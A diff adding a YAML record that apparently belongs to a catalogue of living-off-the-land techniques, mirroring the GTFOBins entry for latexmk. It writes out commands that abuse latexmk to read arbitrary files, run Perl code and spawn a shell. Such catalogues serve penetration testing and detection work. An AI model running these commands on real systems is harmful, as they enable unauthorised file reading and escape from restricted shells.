@@ -1,0 +1,93 @@
+id: gtfobins/latexmk/file-read/unprivileged
+type: binary
+platform: linux
+name: latexmk
+phases:
+- collection
+capabilities:
+- file-read
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'echo ''\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}''
+    >/path/to/temp-file
+
+    latexmk -dvi /path/to/temp-file
+
+    strings temp-file.dvi'
+  comment: The read file will be part of the output.
+references:
+- https://gtfobins.github.io/gtfobins/latexmk/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        latexmk:
+          functions:
+            file-read:
+            - binary: false
+              code: 'echo ''\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}''
+                >/path/to/temp-file
+
+                latexmk -dvi /path/to/temp-file
+
+                strings temp-file.dvi'
+              comment: The read file will be part of the output.
+              contexts:
+                sudo: null
+                unprivileged: null
+            inherit:
+            - code: latexmk -e '...'
+              comment: This allows to run Perl code (`...`).
+              contexts:
+                sudo: null
+                unprivileged: null
+              from: perl
+            shell:
+            - code: 'latexmk -pdf -pdflatex=''/bin/sh #'' /dev/null'
+              contexts:
+                sudo: null
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/latexmk/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-read
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: collection
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:d168cccce7bd7421e5b145319655cbbc9615311982055fba490400b30c67dd75
